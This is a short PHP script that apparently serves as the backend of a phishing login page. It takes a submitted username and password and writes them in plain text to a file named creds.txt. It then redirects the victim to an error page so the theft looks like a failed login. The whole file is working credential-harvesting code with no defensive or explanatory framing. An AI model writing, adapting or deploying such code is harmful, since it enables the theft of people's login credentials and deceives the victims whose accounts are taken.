<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['username']) && !empty($_POST['password'])) {
        file_put_contents("creds.txt", "User: {$_POST['username']} | Pass: {$_POST['password']}\n", FILE_APPEND);
        // Redirect BEFORE any output
        header("Location: error.html");
        exit;
    } else {
        // Still redirect if empty (optional: you can show custom message instead)
        header("Location: error.html");
        exit;
    }
} else {
    // Direct access - optionally redirect or show error
    header("Location: index.php");
    exit;
}
